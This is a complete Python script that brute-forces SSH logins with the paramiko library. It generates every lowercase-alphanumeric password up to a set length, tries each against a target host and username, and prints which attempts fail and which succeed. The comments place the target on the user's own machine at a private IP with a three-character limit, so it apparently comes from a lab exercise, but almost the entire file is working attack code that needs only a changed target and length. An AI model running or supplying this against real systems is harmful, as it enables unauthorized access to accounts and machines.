import paramiko
import itertools
import string

def attempt_ssh_login(ip, username, password):
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh_client.connect(ip, username=username, password=password)
        print(f"Success: {username}@{ip} with password: {password}")
        return True
    except paramiko.AuthenticationException:
        print(f"Failed: {username}@{ip} with password: {password}")
        return False
    finally:
        ssh_client.close()

def brute_force_attack(ip, username, max_length):
    chars = string.ascii_lowercase + string.digits  # Character set to use
    for length in range(1, max_length + 1):
        for password in itertools.product(chars, repeat=length):
            password = ''.join(password)
            if attempt_ssh_login(ip, username, password):
                return

target_ip = "192.168.43.128"  # IP address of your macOS (localhost)
username = "your_username"  # Replace with your macOS username

# Start brute force attack with passwords up to length 3
brute_force_attack(target_ip, username, 3)

